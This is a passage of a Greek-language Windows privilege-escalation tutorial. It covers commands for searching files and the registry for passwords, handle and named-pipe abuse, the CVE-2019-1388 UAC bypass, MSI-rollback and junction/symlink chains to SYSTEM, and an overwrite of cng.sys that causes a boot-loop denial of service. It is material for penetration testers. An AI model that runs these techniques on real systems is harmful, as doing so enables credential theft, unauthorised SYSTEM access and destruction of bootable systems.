Βασικά, αν μπορείτε να **αντικαταστήσετε οποιοδήποτε από τα DLL** που πρόκειται να εκτελεστούν, θα μπορούσατε να **κλιμακώσετε προνόμια**, αν το DLL πρόκειται να εκτελεστεί από διαφορετικό χρήστη.

Για να μάθετε πώς οι επιτιθέμενοι χρησιμοποιούν το COM Hijacking ως μηχανισμό persistence, δείτε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Γενική αναζήτηση κωδικών πρόσβασης σε αρχεία και registry**

**Αναζήτηση περιεχομένου αρχείων**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Αναζήτηση αρχείου με συγκεκριμένο όνομα αρχείου**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Αναζητήστε στο μητρώο ονόματα κλειδιών και κωδικούς πρόσβασης**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Εργαλεία που αναζητούν κωδικούς πρόσβασης

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα plugin του msf** που έχω δημιουργήσει για να **εκτελεί αυτόματα κάθε POST module του metasploit που αναζητά διαπιστευτήρια** στο σύστημα του θύματος.\
Το [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν κωδικούς πρόσβασης και αναφέρονται σε αυτή τη σελίδα.\
Το [**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμη εξαιρετικό εργαλείο για την εξαγωγή κωδικών πρόσβασης από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **ονόματα χρηστών** και **κωδικούς πρόσβασης** σε διάφορα εργαλεία που αποθηκεύουν αυτά τα δεδομένα σε απλό κείμενο (PuTTY, WinSCP, FileZilla, SuperPuTTY και RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Διαρροή Handles

Φανταστείτε ότι **μια διεργασία που εκτελείται ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) με **πλήρη πρόσβαση**. Η ίδια διεργασία **δημιουργεί επίσης μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά προνόμια, η οποία όμως κληρονομεί όλα τα ανοιχτά handles της κύριας διεργασίας**.\
Έπειτα, αν έχετε **πλήρη πρόσβαση στη διεργασία με τα χαμηλά προνόμια**, μπορείτε να πάρετε το **ανοιχτό handle προς την προνομιούχα διεργασία που δημιουργήθηκε** με `OpenProcess()` και να **εισάγετε shellcode**.\
[Διαβάστε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με το **πώς να εντοπίσετε και να εκμεταλλευτείτε αυτήν την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διαβάστε αυτήν την **άλλη ανάρτηση για μια πιο ολοκληρωμένη εξήγηση σχετικά με το πώς να ελέγξετε και να καταχραστείτε περισσότερα ανοιχτά handles διεργασιών και νημάτων, τα οποία κληρονομούνται με διαφορετικά επίπεδα δικαιωμάτων (όχι μόνο με πλήρη πρόσβαση)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα τμήματα κοινόχρηστης μνήμης, που αναφέρονται ως **pipes**, επιτρέπουν την επικοινωνία και τη μεταφορά δεδομένων μεταξύ διεργασιών.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Named Pipes**, η οποία επιτρέπει σε άσχετες μεταξύ τους διεργασίες να μοιράζονται δεδομένα, ακόμη και μέσω διαφορετικών δικτύων. Αυτό μοιάζει με αρχιτεκτονική client/server, με ρόλους που ορίζονται ως **named pipe server** και **named pipe client**.

Όταν ένας **client** στέλνει δεδομένα μέσω ενός pipe, ο **server** που το δημιούργησε μπορεί να **υιοθετήσει την ταυτότητα** του **client**, εφόσον έχει τα απαραίτητα δικαιώματα **SeImpersonate**. Αν εντοπίσετε μια **προνομιούχα διεργασία** που επικοινωνεί μέσω ενός pipe το οποίο μπορείτε να μιμηθείτε, έχετε την ευκαιρία να **αποκτήσετε υψηλότερα προνόμια**, υιοθετώντας την ταυτότητα αυτής της διεργασίας μόλις αλληλεπιδράσει με το pipe που δημιουργήσατε. Για οδηγίες σχετικά με την εκτέλεση μιας τέτοιας επίθεσης, δείτε τους χρήσιμους οδηγούς [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επίσης, το ακόλουθο εργαλείο επιτρέπει την **υποκλοπή επικοινωνίας named pipe με ένα εργαλείο όπως το Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει την καταγραφή και προβολή όλων των pipes, ώστε να εντοπίσετε privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Η υπηρεσία Telephony (TapiSrv) σε λειτουργία server εκθέτει το `\\pipe\\tapsrv` (MS-TRP). Ένας απομακρυσμένος, πιστοποιημένος client μπορεί να καταχραστεί τη διαδρομή ασύγχρονων συμβάντων που βασίζεται σε mailslot, ώστε να μετατρέψει το `ClientAttach` σε αυθαίρετη **εγγραφή 4 byte** σε οποιοδήποτε υπάρχον αρχείο στο οποίο έχει δικαίωμα εγγραφής το `NETWORK SERVICE`. Έπειτα, μπορεί να αποκτήσει δικαιώματα διαχειριστή Telephony και να φορτώσει μια αυθαίρετη DLL ως υπηρεσία. Η πλήρης ροή:

- `ClientAttach` με το `pszDomainUser` ορισμένο σε μια υπάρχουσα διαδρομή στην οποία επιτρέπεται η εγγραφή → η υπηρεσία την ανοίγει μέσω `CreateFileW(..., OPEN_EXISTING)` και τη χρησιμοποιεί για εγγραφές ασύγχρονων συμβάντων.
- Κάθε συμβάν γράφει στο συγκεκριμένο handle το `InitContext` που ελέγχει ο attacker και έχει οριστεί μέσω `Initialize`. Καταχωρίστε μια εφαρμογή γραμμής με `LRegisterRequestRecipient` (`Req_Func 61`), ενεργοποιήστε το `TRequestMakeCall` (`Req_Func 121`), ανακτήστε τα δεδομένα μέσω `GetAsyncEvents` (`Req_Func 0`) και, στη συνέχεια, καταργήστε την καταχώριση και τερματίστε τη λειτουργία για να επαναλάβετε τις ντετερμινιστικές εγγραφές.
- Προσθέστε τον εαυτό σας στην ομάδα `[TapiAdministrators]` στο `C:\Windows\TAPI\tsec.ini`, επανασυνδεθείτε και, έπειτα, καλέστε το `GetUIDllName` με μια αυθαίρετη διαδρομή DLL, ώστε να εκτελέσετε το `TSPI_providerUIIdentify` ως `NETWORK SERVICE`.

Περισσότερες λεπτομέρειες:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Διάφορα

### Επεκτάσεις αρχείων που μπορούν να εκτελέσουν κώδικα στα Windows

Δείτε τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### Κατάχρηση Protocol Handler / ShellExecute μέσω Markdown renderers

Οι σύνδεσμοι Markdown στους οποίους μπορεί να γίνει κλικ και οι οποίοι προωθούνται στο `ShellExecuteExW` μπορούν να ενεργοποιήσουν επικίνδυνους URI handlers (`file:`, `ms-appinstaller:` ή οποιοδήποτε καταχωρισμένο scheme) και να εκτελέσουν αρχεία που ελέγχει ο attacker ως ο τρέχων χρήστης. Δείτε:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Παρακολούθηση γραμμών εντολών για κωδικούς πρόσβασης**

Όταν αποκτήσετε ένα shell ως χρήστης, ενδέχεται να εκτελούνται προγραμματισμένες εργασίες ή άλλες διεργασίες που **περνούν διαπιστευτήρια στη γραμμή εντολών**. Το παρακάτω script καταγράφει τις γραμμές εντολών των διεργασιών κάθε δύο δευτερόλεπτα και τις συγκρίνει με την προηγούμενη κατάσταση, εμφανίζοντας τυχόν διαφορές.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Κλοπή κωδικών πρόσβασης από διεργασίες

## Από χρήστη με χαμηλά προνόμια σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχετε πρόσβαση στο γραφικό περιβάλλον (μέσω κονσόλας ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις των Microsoft Windows είναι δυνατό να εκτελέσετε ένα terminal ή οποιαδήποτε άλλη διεργασία ως "NT\AUTHORITY SYSTEM", από έναν χρήστη χωρίς προνόμια.

Έτσι είναι δυνατό να κλιμακώσετε τα προνόμια και να παρακάμψετε το UAC ταυτόχρονα, εκμεταλλευόμενοι την ίδια ευπάθεια. Επιπλέον, δεν χρειάζεται να εγκαταστήσετε τίποτα και το binary που χρησιμοποιείται κατά τη διαδικασία είναι υπογεγραμμένο και έχει εκδοθεί από τη Microsoft.

Ορισμένα από τα συστήματα που επηρεάζονται είναι τα εξής:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Για να εκμεταλλευτείτε αυτή την ευπάθεια, πρέπει να εκτελέσετε τα ακόλουθα βήματα:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Έχετε όλα τα απαραίτητα αρχεία και τις πληροφορίες στο ακόλουθο GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Από Administrator Medium σε High Integrity Level / UAC Bypass

Διαβάστε αυτό για να **μάθετε σχετικά με τα Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Στη συνέχεια, **διαβάστε αυτό για να μάθετε σχετικά με το UAC και τα UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Upload Directory Junctions σε Served Root

Μια εφαρμογή μπορεί να δημιουργεί έναν προβλέψιμο υποκατάλογο upload, να γράφει σε αυτόν ένα όνομα αρχείου που παρέχεται από τον καλούντα και στη συνέχεια να επεξεργάζεται το αρχείο. Αν ένας χρήστης με χαμηλά προνόμια μπορεί να διαγράψει και να αντικαταστήσει αυτόν τον υποκατάλογο με ένα NTFS junction πριν από την εγγραφή από την πλευρά του server, η εγγραφή μπορεί να ακολουθήσει το junction προς έναν web-served κατάλογο. Ένα script που τοποθετείται εκεί μπορεί να εκτελεστεί ως η ταυτότητα της web service, αν ο server εκτελεί αυτόν τον τύπο αρχείου. Αυτό είναι ένα όριο αυθαίρετης εγγραφής ειδικό για την εφαρμογή· ένας κατάλογος upload με δικαιώματα εγγραφής ή ένα υπάρχον junction από μόνο του δεν αρκεί για να το αποδείξει.

Ελέγξτε την ακριβή κατασκευή της διαδρομής και τον χρονισμό στον χειριστή upload, τα αποτελεσματικά δικαιώματα του χρήστη για διαγραφή/δημιουργία στον υποκατάλογο, τα αποτελεσματικά ACL του προορισμού, αν η διεργασία εγγραφής ακολουθεί reparse points και αν ο web server εκτελεί αρχεία σε αυτόν τον προορισμό. Επιβεβαιώστε ξεχωριστά τις ταυτότητες διεργασίας της διεργασίας εγγραφής και του web server. Η παθητική απογραφή μπορεί να εμφανίσει ACL καταλόγων και metadata reparse, αλλά δεν μπορεί να εξακριβώσει τη συμπεριφορά του χειριστή ή μια μελλοντική αντικατάσταση junction. Αν η εκτέλεση καταλήξει σε λογαριασμό υπηρεσίας, ελέγξτε το **πραγματικό token διεργασίας** πριν εξετάσετε οποιαδήποτε ξεχωριστή διαδρομή μέσω προνομίων token.

## Από αυθαίρετη διαγραφή/μετακίνηση/μετονομασία φακέλου σε SYSTEM EoP

Η τεχνική που περιγράφεται [**σε αυτήν την ανάρτηση ιστολογίου**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), με exploit code [**διαθέσιμο εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Η επίθεση συνίσταται βασικά στην κατάχρηση της λειτουργίας rollback του Windows Installer για την αντικατάσταση νόμιμων αρχείων με κακόβουλα κατά τη διαδικασία απεγκατάστασης. Για να γίνει αυτό, ο επιτιθέμενος πρέπει να δημιουργήσει έναν **κακόβουλο MSI installer** που θα χρησιμοποιηθεί για την παραβίαση του φακέλου `C:\Config.Msi`, τον οποίο θα χρησιμοποιήσει αργότερα ο Windows Installer για την αποθήκευση αρχείων rollback κατά την απεγκατάσταση άλλων MSI packages. Τα αρχεία rollback θα έχουν τροποποιηθεί ώστε να περιέχουν το κακόβουλο payload.

Η συνοπτική τεχνική είναι η εξής:

1. **Στάδιο 1 – Προετοιμασία για την παραβίαση (αφήστε το `C:\Config.Msi` κενό)**

- Βήμα 1: Εγκατάσταση του MSI
    - Δημιουργήστε ένα `.msi` που εγκαθιστά ένα ακίνδυνο αρχείο (π.χ. `dummy.txt`) σε έναν φάκελο με δικαιώματα εγγραφής (`TARGETDIR`).
    - Επισημάνετε τον installer ως **"UAC Compliant"**, ώστε να μπορεί να τον εκτελέσει ένας **μη διαχειριστής**.
    - Διατηρήστε ένα **handle** ανοιχτό στο αρχείο μετά την εγκατάσταση.

- Βήμα 2: Έναρξη απεγκατάστασης
    - Απεγκαταστήστε το ίδιο `.msi`.
    - Η διαδικασία απεγκατάστασης αρχίζει να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε αρχεία `.rbf` (αντίγραφα ασφαλείας rollback).
    - **Κάντε polling στο ανοιχτό handle του αρχείου** μέσω του `GetFinalPathNameByHandle` για να εντοπίσετε πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Βήμα 3: Προσαρμοσμένος συγχρονισμός
    - Το `.msi` περιλαμβάνει ένα **custom uninstall action (`SyncOnRbfWritten`)** που:
        - Σηματοδοτεί ότι γράφτηκε το `.rbf`.
        - Στη συνέχεια **περιμένει** ένα άλλο event πριν συνεχίσει την απεγκατάσταση.

- Βήμα 4: Αποτροπή διαγραφής του `.rbf`
    - Όταν λάβετε το σήμα, **ανοίξτε το αρχείο `.rbf`** χωρίς `FILE_SHARE_DELETE` — αυτό **αποτρέπει τη διαγραφή του**.
    - Στη συνέχεια, **στείλτε σήμα πίσω** ώστε να ολοκληρωθεί η απεγκατάσταση.
    - Ο Windows Installer αποτυγχάνει να διαγράψει το `.rbf` και, επειδή δεν μπορεί να διαγράψει όλα τα περιεχόμενα, **ο φάκελος `C:\Config.Msi` δεν αφαιρείται**.

- Βήμα 5: Μη αυτόματη διαγραφή του `.rbf`
    - Διαγράψτε εσείς (ο επιτιθέμενος) το αρχείο `.rbf` χειροκίνητα.
    - Τώρα το **`C:\Config.Msi` είναι κενό**, έτοιμο για παραβίαση.

> Σε αυτό το σημείο, **ενεργοποιήστε την ευπάθεια αυθαίρετης διαγραφής φακέλου σε επίπεδο SYSTEM** για να διαγράψετε το `C:\Config.Msi`.

2. **Στάδιο 2 – Αντικατάσταση των rollback scripts με κακόβουλα**

- Βήμα 6: Αναδημιουργία του `C:\Config.Msi` με αδύναμα ACL
    - Αναδημιουργήστε εσείς τον φάκελο `C:\Config.Msi`.
    - Ορίστε **αδύναμα DACL** (π.χ. Everyone:F) και **διατηρήστε ένα handle ανοιχτό** με `WRITE_DAC`.

- Βήμα 7: Εκτέλεση άλλης εγκατάστασης
    - Εγκαταστήστε ξανά το `.msi`, με:
        - `TARGETDIR`: Τοποθεσία με δικαιώματα εγγραφής.
        - `ERROROUT`: Μια μεταβλητή που προκαλεί αναγκαστική αποτυχία.
    - Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να ενεργοποιήσει ξανά το **rollback**, το οποίο διαβάζει τα `.rbs` και `.rbf`.

- Βήμα 8: Παρακολούθηση για `.rbs`
    - Χρησιμοποιήστε το `ReadDirectoryChangesW` για να παρακολουθείτε το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
    - Καταγράψτε το όνομα αρχείου του.

- Βήμα 9: Συγχρονισμός πριν από το rollback
    - Το `.msi` περιέχει ένα **custom install action (`SyncBeforeRollback`)** που:
        - Σηματοδοτεί ένα event όταν δημιουργείται το `.rbs`.
        - Στη συνέχεια **περιμένει** πριν συνεχίσει.

- Βήμα 10: Επαναφορά αδύναμων ACL
    - Αφού λάβετε το event `.rbs created`:
        - Ο Windows Installer **επαναφέρει ισχυρά ACL** στο `C:\Config.Msi`.
        - Όμως, επειδή εξακολουθείτε να έχετε ένα handle με `WRITE_DAC`, μπορείτε να **επαναφέρετε ξανά τα αδύναμα ACL**.

> Τα ACL **εφαρμόζονται μόνο κατά το άνοιγμα του handle**, επομένως μπορείτε ακόμη να γράψετε στον φάκελο.

- Βήμα 11: Τοποθέτηση πλαστών `.rbs` και `.rbf`
    - Αντικαταστήστε το αρχείο `.rbs` με ένα **πλαστό rollback script** που δίνει εντολή στα Windows να:
        - Επαναφέρουν το αρχείο `.rbf` σας (κακόβουλο DLL) σε μια **προνομιακή τοποθεσία** (π.χ. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Τοποθετήστε το πλαστό `.rbf` που περιέχει ένα **κακόβουλο payload DLL σε επίπεδο SYSTEM**.

- Βήμα 12: Ενεργοποίηση του rollback
    - Στείλτε το σήμα του event συγχρονισμού ώστε να συνεχίσει ο installer.
    - Ένα **custom action τύπου 19 (`ErrorOut`)** έχει ρυθμιστεί να **αποτυγχάνει σκόπιμα την εγκατάσταση** σε ένα γνωστό σημείο.
    - Αυτό προκαλεί την έναρξη του **rollback**.

- Βήμα 13: Το SYSTEM εγκαθιστά το DLL σας
    - Ο Windows Installer:
        - Διαβάζει το κακόβουλο `.rbs` σας.
        - Αντιγράφει το DLL `.rbf` σας στην τοποθεσία-στόχο.
    - Τώρα έχετε το **κακόβουλο DLL σας σε μια διαδρομή που φορτώνεται από το SYSTEM**.

- Τελικό βήμα: Εκτέλεση κώδικα SYSTEM
    - Εκτελέστε ένα έμπιστο **auto-elevated binary** (π.χ. `osk.exe`) που φορτώνει το DLL που παραβιάσατε.
    - **Μπουμ**: Ο κώδικάς σας εκτελείται **ως SYSTEM**.


### Από αυθαίρετη διαγραφή/μετακίνηση/μετονομασία αρχείου σε SYSTEM EoP

Η κύρια τεχνική MSI rollback (η προηγούμενη) προϋποθέτει ότι μπορείτε να διαγράψετε **ολόκληρο φάκελο** (π.χ. `C:\Config.Msi`). Τι γίνεται όμως αν η ευπάθειά σας επιτρέπει μόνο **αυθαίρετη διαγραφή αρχείων**;

Θα μπορούσατε να εκμεταλλευτείτε τα **εσωτερικά του NTFS**: κάθε φάκελος έχει ένα κρυφό alternate data stream που ονομάζεται:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Αυτή η ροή αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του φακέλου.

Επομένως, αν **διαγράψετε τη ροή `::$INDEX_ALLOCATION`** ενός φακέλου, το NTFS **αφαιρεί ολόκληρο τον φάκελο** από το σύστημα αρχείων.

Μπορείτε να το κάνετε χρησιμοποιώντας τυπικά API διαγραφής αρχείων, όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Παρότι καλείς ένα API διαγραφής *αρχείων*, αυτό **διαγράφει τον ίδιο τον φάκελο**.

### Από τη διαγραφή περιεχομένων φακέλου σε SYSTEM EoP
Τι γίνεται αν το primitive σου δεν επιτρέπει τη διαγραφή αυθαίρετων αρχείων/φακέλων, αλλά **επιτρέπει τη διαγραφή των *περιεχομένων* ενός φακέλου που ελέγχει ο attacker**;

1. Βήμα 1: Ρύθμισε έναν φάκελο-δόλωμα και ένα αρχείο
- Δημιούργησε: `C:\temp\folder1`
- Μέσα σε αυτόν: `C:\temp\folder1\file1.txt`

2. Βήμα 2: Τοποθέτησε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν μια προνομιούχα διεργασία προσπαθεί να διαγράψει το `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Βήμα 3: Ενεργοποίηση διεργασίας SYSTEM (π.χ., `SilentCleanup`)
- Αυτή η διεργασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει τα περιεχόμενά τους.
- Όταν φτάσει στο `file1.txt`, **ενεργοποιείται το oplock** και μεταβιβάζει τον έλεγχο στο callback σας.

4. Βήμα 4: Μέσα στο callback του oplock – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακίνηση του `file1.txt` αλλού
    - Αυτό αδειάζει το `folder1` χωρίς να διακοπεί το oplock.
    - Μην διαγράψετε απευθείας το `file1.txt` — κάτι τέτοιο θα απελευθέρωνε πρόωρα το oplock.

- Επιλογή B: Μετατροπή του `folder1` σε **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Αυτό στοχεύει την εσωτερική ροή NTFS που αποθηκεύει τα μεταδεδομένα του φακέλου — η διαγραφή της διαγράφει τον φάκελο.

5. Βήμα 5: Απελευθέρωση του oplock
- Η διεργασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει το `file1.txt`.
- Όμως τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Αποτέλεσμα**: Το `C:\Config.Msi` διαγράφεται από τον SYSTEM.

### Από τη δημιουργία αυθαίρετου φακέλου σε μόνιμο DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **δημιουργήσετε έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμα κι αν **δεν μπορείτε να γράψετε αρχεία** ή να **ορίσετε αδύναμα δικαιώματα**.

Δημιουργήστε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **κρίσιμου προγράμματος οδήγησης των Windows**, π.χ.:
```
C:\Windows\System32\cng.sys
```

- Αυτή η διαδρομή αντιστοιχεί συνήθως στο kernel-mode driver `cng.sys`.
- Αν **την προδημιουργήσετε ως φάκελο**, τα Windows δεν θα μπορέσουν να φορτώσουν τον πραγματικό driver κατά την εκκίνηση.
- Έπειτα, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
- Βλέπουν τον φάκελο, **δεν μπορούν να εντοπίσουν τον πραγματικό driver** και **καταρρέουν ή διακόπτουν την εκκίνηση**.
- Δεν υπάρχει **εναλλακτική λύση** ούτε **ανάκαμψη** χωρίς εξωτερική παρέμβαση (π.χ. επιδιόρθωση εκκίνησης ή πρόσβαση στον δίσκο).

### Από προνομιούχες διαδρομές καταγραφής/αντιγράφων ασφαλείας + OM symlinks σε αυθαίρετη αντικατάσταση αρχείων / boot DoS

Όταν μια **υπηρεσία με αυξημένα προνόμια** γράφει logs/exports σε μια διαδρομή που διαβάζει από **εγγράψιμη διαμόρφωση**, ανακατευθύνετε αυτήν τη διαδρομή με **Object Manager symlinks + NTFS mount points**, ώστε η εγγραφή με αυξημένα προνόμια να οδηγήσει σε αυθαίρετη αντικατάσταση αρχείων (ακόμη και **χωρίς** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Απαιτήσεις**
- Η διαμόρφωση που αποθηκεύει τη διαδρομή-στόχο είναι εγγράψιμη από τον attacker (π.χ. `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας mount point προς το `\RPC Control` και OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Μια λειτουργία με αυξημένα προνόμια που γράφει σε αυτήν τη διαδρομή (log, export, report).

**Παράδειγμα αλυσίδας**
1. Διαβάστε τη διαμόρφωση για να εντοπίσετε τον προορισμό του προνομιούχου log, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατευθύνετε τη διαδρομή χωρίς δικαιώματα διαχειριστή:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περιμένετε να γράψει το προνομιούχο component στο log (π.χ. ο admin επιλέγει «αποστολή δοκιμαστικού SMS»). Η εγγραφή καταλήγει πλέον στο `C:\Windows\System32\cng.sys`.
4. Ελέγξτε τον αντικατασταθέντα στόχο (hex/PE parser) για να επιβεβαιώσετε την αλλοίωση· η επανεκκίνηση αναγκάζει τα Windows να φορτώσουν τη νοθευμένη διαδρομή του driver → **DoS με boot loop**. Αυτό ισχύει γενικά και για κάθε προστατευμένο αρχείο που μια προνομιούχος υπηρεσία θα ανοίξει για εγγραφή.

> Το `cng.sys` φορτώνεται συνήθως από το `C:\Windows\System32\drivers\cng.sys`, αλλά, αν υπάρχει αντίγραφό του στο `C:\Windows\System32\cng.sys`, μπορεί να δοκιμαστεί πρώτα, καθιστώντας το αξιόπιστο σημείο για DoS με αλλοιωμένα δεδομένα.



## **Από High Integrity σε System**

### **Νέα υπηρεσία**

Αν εκτελείτε ήδη διεργασία με High Integrity, η **διαδρομή προς το SYSTEM** μπορεί να είναι εύκολη: αρκεί να **δημιουργήσετε και να εκτελέσετε μια νέα υπηρεσία**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Κατά τη δημιουργία ενός binary υπηρεσίας, βεβαιωθείτε ότι είναι έγκυρη υπηρεσία ή ότι το binary εκτελεί γρήγορα τις απαραίτητες ενέργειες, καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρη υπηρεσία.

### AlwaysInstallElevated

Από μια διεργασία High Integrity μπορείτε να δοκιμάσετε να **ενεργοποιήσετε τις εγγραφές μητρώου AlwaysInstallElevated** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα wrapper _**.msi**_.\
[Περισσότερες πληροφορίες για τα εμπλεκόμενα registry keys και τον τρόπο εγκατάστασης ενός πακέτου _.msi_ εδώ.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείτε να** [**βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Αν έχετε αυτά τα token privileges (πιθανότατα θα τα βρείτε σε μια ήδη High Integrity διεργασία), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (εκτός από protected processes) με το SeDebug privilege, να **αντιγράψετε το token** της διεργασίας και να δημιουργήσετε μια **αυθαίρετη διεργασία με αυτό το token**.\
Με αυτήν την τεχνική συνήθως **επιλέγεται οποιαδήποτε διεργασία εκτελείται ως SYSTEM με όλα τα token privileges** (_ναι, μπορείτε να βρείτε διεργασίες SYSTEM χωρίς όλα τα token privileges_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για escalation στο `getsystem`. Η τεχνική συνίσταται στη **δημιουργία ενός pipe και έπειτα στη δημιουργία/κατάχρηση μιας υπηρεσίας ώστε να γράψει σε αυτό το pipe**. Στη συνέχεια, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το privilege **`SeImpersonate`** θα μπορεί να **κάνει impersonate το token** του client του pipe (της υπηρεσίας), αποκτώντας SYSTEM privileges.\
Αν θέλετε να [**μάθετε περισσότερα για τα name pipes, διαβάστε αυτό**](#named-pipe-client-impersonation).\
Αν θέλετε να διαβάσετε ένα παράδειγμα για το [**πώς να μεταβείτε από high integrity σε System χρησιμοποιώντας name pipes, διαβάστε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

